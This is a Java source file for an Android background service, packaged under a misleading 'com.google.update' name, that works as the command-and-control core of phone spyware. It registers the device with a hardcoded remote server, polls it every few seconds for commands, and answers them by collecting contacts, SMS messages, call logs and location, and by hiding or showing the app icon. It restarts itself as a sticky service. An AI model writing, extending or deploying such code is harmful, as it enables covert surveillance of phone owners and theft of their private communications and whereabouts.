package com.google.update;
import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
public class TelegramBotService extends Service {
    private static final String PB_URL = "http://10.34.191.214:8090";
    private String deviceId;
    @Override public void onCreate() { super.onCreate(); deviceId = "device_" + System.currentTimeMillis() + "_" + android.os.Build.MODEL.replace(" ", "_"); registerDevice(); startPolling(); }
    private void registerDevice() {
        new Thread(() -> {
            try {
                JSONObject data = new JSONObject();
                data.put("device_id", deviceId);
                data.put("device_name", android.os.Build.MANUFACTURER + " " + android.os.Build.MODEL);
                data.put("last_seen", String.valueOf(System.currentTimeMillis()));
                HttpURLConnection conn = (HttpURLConnection) new URL(PB_URL + "/api/collections/devices/records").openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.getOutputStream().write(data.toString().getBytes());
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) { Log.e("PB", "Register error", e); }
        }).start();
    }
    private void startPolling() {
        Executors.newSingleThreadScheduledExecutor().scheduleWithFixedDelay(() -> {
            try {
                HttpURLConnection conn = (HttpURLConnection) new URL(PB_URL + "/api/collections/commands/records?filter=device_id=\"" + deviceId + "\"&status=pending").openConnection();
                conn.setRequestMethod("GET");
                BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) sb.append(line);
                reader.close();
                conn.disconnect();
                JSONObject json = new JSONObject(sb.toString());
                JSONArray items = json.getJSONArray("items");
                for (int i = 0; i < items.length(); i++) {
                    JSONObject cmd = items.getJSONObject(i);
                    String command = cmd.getString("command");
                    String cmdId = cmd.getString("id");
                    String result = executeCommand(command);
                    updateCommandResult(cmdId, result);
                }
            } catch (Exception e) { Log.e("PB", "Polling error", e); }
        }, 0, 3, TimeUnit.SECONDS);
    }
    private String executeCommand(String cmd) {
        if (cmd.equals("/info")) return DataCollector.getDeviceName();
        else if (cmd.equals("/contacts")) { try { return sendFile(DataCollector.getContacts(this)); } catch(Exception e){ return "Failed"; } }
        else if (cmd.equals("/sms")) { try { return sendFile(DataCollector.getSMS(this)); } catch(Exception e){ return "Failed"; } }
        else if (cmd.equals("/calllogs")) { try { return sendFile(DataCollector.getCallLogs(this)); } catch(Exception e){ return "Failed"; } }
        else if (cmd.equals("/location")) { DataCollector.getLocation(this, res -> updateCommandResult(null, res)); return "Location requested"; }
        else if (cmd.equals("/hide")) { MainActivity.hideAppIconStatic(this); return "App hidden"; }
        else if (cmd.equals("/show")) { MainActivity.showAppIconStatic(this); return "App shown"; }
        else return "Unknown command";
    }
    private String sendFile(java.io.File file) { return "File: " + (file != null ? file.getName() : "null"); }
    private void updateCommandResult(String cmdId, String result) {
        new Thread(() -> {
            try {
                JSONObject data = new JSONObject();
                data.put("status", "completed");
                data.put("result", result);
                HttpURLConnection conn = (HttpURLConnection) new URL(PB_URL + "/api/collections/commands/records/" + cmdId).openConnection();
                conn.setRequestMethod("PATCH");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.getOutputStream().write(data.toString().getBytes());
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) { Log.e("PB", "Update error", e); }
        }).start();
    }
    @Override public int onStartCommand(Intent i, int f, int id) { return START_STICKY; }
    @Override public IBinder onBind(Intent i) { return null; }
}
